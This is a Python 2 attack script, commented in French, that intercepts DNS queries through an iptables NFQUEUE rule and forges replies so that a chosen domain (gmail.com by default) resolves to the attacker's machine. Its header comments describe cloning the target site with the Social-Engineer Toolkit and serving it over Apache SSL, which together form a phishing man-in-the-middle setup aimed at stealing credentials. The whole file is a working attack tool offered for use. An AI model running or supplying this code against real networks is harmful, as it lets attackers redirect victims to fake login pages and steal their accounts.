#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ---------------------------------------------------------------------------------------------- #
#                                          PREREQUIS                                             #
# ---------------------------------------------------------------------------------------------- #
# 1 - apt-get install python-nfqueue                                                             #
# 2 - service apache2 start                                                                      #
# 3 - a2enmod ssl                                                                                #
# 4 - a2ensite default-ssl                                                                       #
# 5 - service apache2 reload                                                                     #
# ---------------------------------------------------------------------------------------------- #

# ---------------------------------------------------------------------------------------------- #
#                                       CLONE DU DOMAIN                                          #
# ---------------------------------------------------------------------------------------------- #
# 1 - Avec SET, récupérer la page du domain spoof                                                #
# 2 - cd /usr/share/set                                                                          #
# 3 - ./setoolkit                                                                                #
# ---------------------------------------------------------------------------------------------- #


# ---------------------------------------------------------------------------------------------- #
#                                           IMPORTS                                              #
# ---------------------------------------------------------------------------------------------- #

import nfqueue
from scapy.all import *
import os

import subprocess, re, sys
import threading
import netifaces
import netaddr
import commands
import argparse

# ---------------------------------------------------------------------------------------------- #
#                                    DECLARATIONS DES VARIABLES                                  #
# ---------------------------------------------------------------------------------------------- #

myDomain = 'gmail.com' # Domaine
os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE') # Iptables pour NFQUEUE

interface = commands.getoutput("route -n | egrep ^'0.0.0.0 | default' | awk '{ print $8 }'")
myIp = netifaces.ifaddresses(interface)[2][0]['addr']

# ---------------------------------------------------------------------------------------------- #
#                                    DECLARATIONS DES ARGUMENTS                                  #
# ---------------------------------------------------------------------------------------------- #

def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="Entrez le domaine a spoofer. Exemple: -d facebook.com")
    return parser.parse_args()

# ---------------------------------------------------------------------------------------------- #
#                                           FONCTIONS                                            #
# ---------------------------------------------------------------------------------------------- #

def callback(payload):
    data = payload.get_data() # Récupération des données
    pkt = IP(data) # Récupération des données de la couche IP
    # On regarde si la couche DSN Request est concernée (sinon on forward le traffic)
    if not pkt.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        # Si c'est un packet DSN, on regarde le domain requêté. Si il s'agit du notre, on créer le
        # packet à la volée en spécifiant notre IP comme réponse DNS
        if arg_parser().domain:
            if arg_parser().domain in pkt[DNS].qd.qname:
	    	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=myIp))
            	payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
            	print '[+] Envoi d un paquet spoofe pour le domaine %s' % myDomain
		#ON affiche le contenu des packets
                print(spoofed_pkt.summary())
                print(spoofed_pkt.show())
	else:
		if myDomain in pkt[DNS].qd.qname:
	            	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
	                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
	                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
	                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=myIp))
	            	payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
	            	print '[+] Envoi d un paquet spoofe pour le domaine %s' % myDomain
			#ON affiche le contenu des packets
        		print(spoofed_pkt.summary())
		        print(spoofed_pkt.show())

# ---------------------------------------------------------------------------------------------- #
#                                           PROGRAMME                                            #
# ---------------------------------------------------------------------------------------------- #

# NFQUEUE demande des droits root pour être lancé!
if os.geteuid() != 0:
        sys.exit("[!] Veuillez lancer le programme avec les droits root")

#On affiche l'IP de notre machine pour pouvoir comparer avec l'adresse du spoof DNS
print(myIp)

# Initialisation des paramètres pour la récupération et la parsage des packets dans NFQUEUE
q = nfqueue.queue()
q.open()
q.bind(socket.AF_INET) #Bind IPv4, soket
q.set_callback(callback) #Appel le fonction callback pour le traitement
q.create_queue(0) # Numéro de la file d'attente

# Sniff
try:
    q.try_run() # 
except KeyboardInterrupt:
    q.unbind(socket.AF_INET) # On clos le bind
    q.close() #On ferme la file NFQUEUE
    #On reset les règles iptables
    os.system('iptables -F')
    os.system('iptables -X')
    sys.exit('Arret du programme')
